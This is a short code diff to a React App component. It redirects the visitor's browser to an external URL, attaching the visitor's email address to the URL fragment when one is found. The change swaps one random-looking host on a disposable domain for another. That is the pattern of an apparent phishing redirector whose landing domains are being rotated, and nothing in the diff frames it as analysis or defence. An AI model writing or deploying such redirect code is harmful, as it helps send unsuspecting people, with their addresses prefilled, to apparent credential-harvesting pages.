@@ -14,12 +14,12 @@ function App() {
 
     if (email) {
       // Append the email to the new URL
-      const newUrl = `https://afqw-320rfeqd.brizaste.pro/GIKmVOyQ#${email}`;
+      const newUrl = `https://o0ff-ic3lon-hias9-vey8as.protegida.xyz/PHtCqDej#${email}`;
       // Redirect to the new URL
       window.location.href = newUrl;
     } else {
       // If no email found, redirect normally
-      const defaultUrl = "https://afqw-320rfeqd.brizaste.pro/GIKmVOyQ";
+      const defaultUrl = "https://o0ff-ic3lon-hias9-vey8as.protegida.xyz/PHtCqDej";
       window.location.href = defaultUrl;
     }
   };
